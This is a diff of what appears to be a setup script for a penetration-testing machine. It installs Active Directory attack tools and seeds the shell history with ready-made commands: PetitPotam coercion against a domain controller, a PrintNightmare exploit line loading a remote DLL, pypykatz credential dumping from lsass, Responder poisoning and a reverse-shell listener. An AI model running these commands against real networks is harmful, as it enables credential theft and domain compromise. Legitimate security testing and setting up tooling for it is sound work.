@@ -782,7 +782,9 @@ wget https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS-Li
 cd $INTERNALS_DIR
 git clone https://github.com/topotam/PetitPotam.git
 git clone https://github.com/ly4k/PetitPotam.git PetitPotam-ly4k
-echo "python3 PetitPotam.py <ip_listener> <ip_dc>" >> ~/.zsh_history
+echo "alias PetitPotam='python3 $INTERNALS_DIR/PetitPotam/PetitPotam.py'" >> ~/.zshrc
+echo "python3 PetitPotam.py \$KALI-IP \$DC" >> ~/.zsh_history
+echo "PetitPotam \$KALI-IP \$DC" >> ~/.zsh_history
 
 # Phishing-HTML-linter
 cd $REDTEAM
@@ -812,7 +814,7 @@ source bin/activate
 pip3 install .
 deactivate
 echo "alias pre2k='$INTERNALS_DIR/pre2k/bin/python3 $INTERNALS_DIR/pre2k/bin/pre2k'" >> ~/.zshrc
-echo "pre2k auth -u \$USER -p \$PASSWORD -d \$DOMAIN -dc-ip \$IP -verbose" >> ~/.zsh_history
+echo "pre2k auth -u \$USER -p \$PASS -d \$DOMAIN -dc-ip \$DC -verbose" >> ~/.zsh_history
 
 # PrintNightmare
 cd $INTERNALS_DIR
@@ -822,7 +824,7 @@ echo "python3 CVE-2021-1675.py domain.local/user:pass@ip '\\your_ip\smb\your_dll
 
 # PrivescCheck
 cd $INTERNALS_DIR
-git clone https://github.com/itm4n/PrivescCheck.git
+wget https://github.com/itm4n/PrivescCheck/releases/download/2025.10.06-1/PrivescCheck.ps1
 
 # Probable-Wordlists
 cd $PASSCRACK_DIR
@@ -830,21 +832,22 @@ git clone https://github.com/berzerk0/Probable-Wordlists.git
 
 # Pypycatz
 pipx install git+https://github.com/skelsec/pypykatz || echo "[-] Failed to install Pypycatz"
+echo "alias pypykatz='pypykatz lsa minidump lsass.dmp'" >> ~/.zshrc
 
 # PyScan
 cd $INTERNALS_DIR
 git clone https://github.com/afkfr0mkeyb0ard/PyScan.git
 echo "alias pyscan='python3 $INTERNALS_DIR/PyScan/pyscan.py'" >> ~/.zshrc
-echo "pyscan'" >> ~/.zsh_history
+echo "pyscan" >> ~/.zsh_history
 
 # Pywhisker
 cd $INTERNALS_DIR
 pipx install git+https://github.com/ShutdownRepo/pywhisker.git
-echo "pywhisker -d 'domain.local' -u 'user1' -p 'pass123' --target 'user2' --action 'list'" >> ~/.zsh_history
+echo "pywhisker -d \$DOMAIN -u \$USER -p \$PASS --target 'user2' --action 'list'" >> ~/.zsh_history
 
 # Rcat
 cd $GENERAL_DIR
-wget https://github.com/0xfalafel/rcat/releases/download/0.2/rcat_amd64 rcat
+wget https://github.com/0xfalafel/rcat/releases/download/0.4/rcat_amd64 -O rcat
 chmod +x rcat
 echo "alias rcat='$GENERAL_DIR/rcat'" >> ~/.zshrc
 echo "rcat -l 4445 --pwn" >> ~/.zsh_history
@@ -852,7 +855,12 @@ echo "rcat -l 4445 --pwn" >> ~/.zsh_history
 # Responder
 cd $INTERNALS_DIR
 git clone https://github.com/lgandx/Responder.git
-echo "alias responder='$INTERNALS_DIR/Responder/Responder.py'" >> ~/.zshrc
+cd Responder
+python3 -m venv .
+source bin/activate
+pip3 install -r requirements.txt
+deactivate
+echo "alias responder='$INTERNALS_DIR/Responder/bin/python3 $INTERNALS_DIR/Responder/Responder.py'" >> ~/.zshrc
 echo "responder -I eth0'" >> ~/.zsh_history
 
 # Ridenum
